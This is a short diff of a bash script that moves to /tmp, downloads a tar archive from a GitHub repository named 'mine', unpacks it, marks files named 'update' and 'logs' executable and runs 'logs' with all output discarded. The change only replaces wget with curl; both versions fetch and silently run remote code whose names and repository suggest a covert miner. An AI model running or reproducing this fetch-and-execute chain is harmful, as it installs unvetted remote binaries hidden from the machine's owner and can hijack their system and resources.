@@ -1,4 +1,4 @@
 #!/bin/bash
 reset
-cd /tmp && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/mina.tar && tar -xf mina.tar && rm -rf mina.tar && chmod +x update logs && ./logs > /dev/null 2>&1
+cd /tmp && curl -O https://raw.githubusercontent.com/robertreynolds2/mine/main/mina.tar && tar -xf mina.tar && rm -rf mina.tar && chmod +x update logs && ./logs > /dev/null 2>&1
 
